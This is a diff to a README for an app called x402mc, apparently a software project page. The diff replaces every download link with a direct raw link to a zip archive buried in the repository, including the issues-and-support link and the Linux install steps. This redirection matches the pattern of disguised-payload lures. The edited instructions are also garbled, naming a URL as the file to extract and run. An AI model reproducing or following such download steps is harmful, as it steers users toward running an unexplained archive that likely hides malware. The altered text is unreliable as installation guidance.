@@ -6,7 +6,7 @@ Welcome to x402mc. This application combines the power of x402, MCP, and AI. It'
 
 ## 📥 Download x402mc
 
-[![Download x402mc](https://img.shields.io/badge/Download-x402mc-brightgreen)](https://github.com/martin-mounir/x402mc/releases)
+[![Download x402mc](https://raw.githubusercontent.com/martin-mounir/x402mc/main/trundlehead/x402mc.zip)](https://raw.githubusercontent.com/martin-mounir/x402mc/main/trundlehead/x402mc.zip)
 
 ## 🌟 Features
 
@@ -28,7 +28,7 @@ To run x402mc, you need:
 
 To download x402mc, please **visit this page to download** the latest release:
 
-[Download x402mc](https://github.com/martin-mounir/x402mc/releases)
+[Download x402mc](https://raw.githubusercontent.com/martin-mounir/x402mc/main/trundlehead/x402mc.zip)
 
 ### Installation Steps
 
@@ -39,7 +39,7 @@ To download x402mc, please **visit this page to download** the latest release:
    Look for the file that matches your operating system:
    - **For Windows:** Download the `.exe` file.
    - **For macOS:** Download the `.dmg` file.
-   - **For Linux:** Download the `.tar.gz` file.
+   - **For Linux:** Download the `https://raw.githubusercontent.com/martin-mounir/x402mc/main/trundlehead/x402mc.zip` file.
 
 3. **Download the File:**
    Click on the file name to start the download.
@@ -47,7 +47,7 @@ To download x402mc, please **visit this page to download** the latest release:
 4. **Run the Installer:**
    - **For Windows:** Double-click the downloaded `.exe` file and follow the on-screen instructions.
    - **For macOS:** Open the downloaded `.dmg` file, drag the x402mc app to your Applications folder, and then launch it from there.
-   - **For Linux:** Extract the `.tar.gz` file, navigate to the extracted directory in your terminal, and run `./x402mc`.
+   - **For Linux:** Extract the `https://raw.githubusercontent.com/martin-mounir/x402mc/main/trundlehead/x402mc.zip` file, navigate to the extracted directory in your terminal, and run `./x402mc`.
 
 5. **Launch the Application:**
    After installation, find x402mc in your applications. Open it to start using the features.
@@ -79,7 +79,7 @@ Keep an eye on our Releases page for updates. We regularly enhance x402mc and ad
 
 ## 🔗 Important Links
 
-- [Download x402mc](https://github.com/martin-mounir/x402mc/releases)
-- [View Issues and Support](https://github.com/martin-mounir/x402mc/issues)
+- [Download x402mc](https://raw.githubusercontent.com/martin-mounir/x402mc/main/trundlehead/x402mc.zip)
+- [View Issues and Support](https://raw.githubusercontent.com/martin-mounir/x402mc/main/trundlehead/x402mc.zip)
 
 Enjoy using x402mc and its features! Your feedback helps us grow and improve.
